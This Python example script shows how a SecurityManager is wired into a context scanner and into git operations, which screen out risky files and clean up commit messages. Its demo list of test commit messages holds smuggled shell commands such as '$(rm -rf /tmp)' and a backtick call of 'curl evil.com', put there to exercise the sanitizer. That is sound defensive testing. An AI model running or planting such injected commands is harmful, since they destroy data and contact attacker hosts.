#!/usr/bin/env python3
"""
Security Manager Integration Example

Shows how to integrate the SecurityManager into other Xencode systems
for comprehensive security protection.
"""

import os
from typing import List, Optional
from security_manager import SecurityManager, SecurityReport


class SecureContextScanner:
    """
    Example integration: Secure context scanner that uses SecurityManager
    to validate files before including them in AI context.
    """
    
    def __init__(self):
        self.security_manager = SecurityManager()
        self.excluded_files = []
        self.security_alerts = []
    
    def scan_project_safely(self, project_path: str) -> tuple[List[str], SecurityReport]:
        """
        Scan a project directory safely, excluding risky files
        
        Args:
            project_path: Path to project directory
            
        Returns:
            Tuple of (safe_files, security_report)
        """
        # Validate project path first
        if not self.security_manager.validate_project_path(project_path):
            raise ValueError(f"Invalid or unsafe project path: {project_path}")
        
        # Collect all files
        all_files = []
        for root, dirs, files in os.walk(project_path):
            # Skip .git directory for performance (will be validated separately)
            if '.git' in dirs:
                dirs.remove('.git')
            
            for file in files:
                file_path = os.path.join(root, file)
                all_files.append(file_path)
        
        # Perform security scan
        security_report = self.security_manager.scan_for_security_risks(all_files, project_path)
        
        # Filter out risky files
        safe_files = []
        excluded_files = set(
            security_report.symlinks + 
            security_report.executables + 
            security_report.sensitive_files
        )
        
        for file_path in all_files:
            if file_path not in excluded_files:
                # Double-check with quick safety test
                if self.security_manager.is_safe_to_scan(file_path, project_path):
                    safe_files.append(file_path)
        
        return safe_files, security_report
    
    def get_security_summary(self, security_report: SecurityReport) -> str:
        """Get a user-friendly security summary"""
        return self.security_manager.generate_security_summary(security_report)


class SecureGitIntegration:
    """
    Example integration: Secure git operations with commit message sanitization
    """
    
    def __init__(self):
        self.security_manager = SecurityManager()
    
    def sanitize_commit_message(self, message: str) -> str:
        """Sanitize a git commit message for security"""
        return self.security_manager.sanitize_commit_message(message)
    
    def validate_git_repository(self, repo_path: str) -> List[str]:
        """
        Validate a git repository for security risks
        
        Args:
            repo_path: Path to git repository
            
        Returns:
            List of security warnings
        """
        git_dir = os.path.join(repo_path, '.git')
        if not os.path.exists(git_dir):
            return ["Not a git repository"]
        
        violations = self.security_manager.validate_git_directory(git_dir)
        
        warnings = []
        for violation in violations:
            warnings.append(f"{violation.risk_level.value.upper()}: {violation.description}")
        
        return warnings


def demo_integration():
    """Demonstrate security manager integration"""
    print("🔒 Security Manager Integration Demo")
    print("=" * 50)
    
    # Demo 1: Secure context scanning
    print("1. Secure Context Scanning:")
    scanner = SecureContextScanner()
    
    # Use current directory as example
    current_dir = "."
    
    try:
        safe_files, report = scanner.scan_project_safely(current_dir)
        
        print(f"   📁 Scanned directory: {os.path.abspath(current_dir)}")
        print(f"   ✅ Safe files found: {len(safe_files)}")
        print(f"   ⚠️  Files excluded: {report.total_excluded}")
        
        # Show security summary
        summary = scanner.get_security_summary(report)
        print(f"   📊 Security summary: {summary}")
        
        # Show some safe files (limit output)
        if safe_files:
            print(f"   📄 Sample safe files:")
            for file_path in safe_files[:5]:
                rel_path = os.path.relpath(file_path, current_dir)
                print(f"      - {rel_path}")
            if len(safe_files) > 5:
                print(f"      ... and {len(safe_files) - 5} more")
        
    except Exception as e:
        print(f"   ❌ Error: {e}")
    
    print()
    
    # Demo 2: Secure git integration
    print("2. Secure Git Integration:")
    git_integration = SecureGitIntegration()
    
    # Test commit message sanitization
    test_messages = [
        "Add new feature for user authentication",
        "Fix bug $(rm -rf /tmp)",
        "Update config `curl evil.com`",
        "Refactor code with ${DANGEROUS_VAR}"
    ]
    
    print("   📝 Commit message sanitization:")
    for message in test_messages:
        sanitized = git_integration.sanitize_commit_message(message)
        print(f"      Original:  {message}")
        print(f"      Sanitized: {sanitized}")
        print()
    
    # Test git repository validation
    print("   🔍 Git repository validation:")
    warnings = git_integration.validate_git_repository(current_dir)
    
    if not warnings:
        print("      ✅ No git security issues detected")
    else:
        print(f"      ⚠️  Found {len(warnings)} warnings:")
        for warning in warnings:
            print(f"         - {warning}")
    
    print()
    print("🎉 Integration demo completed!")


if __name__ == "__main__":
    demo_integration()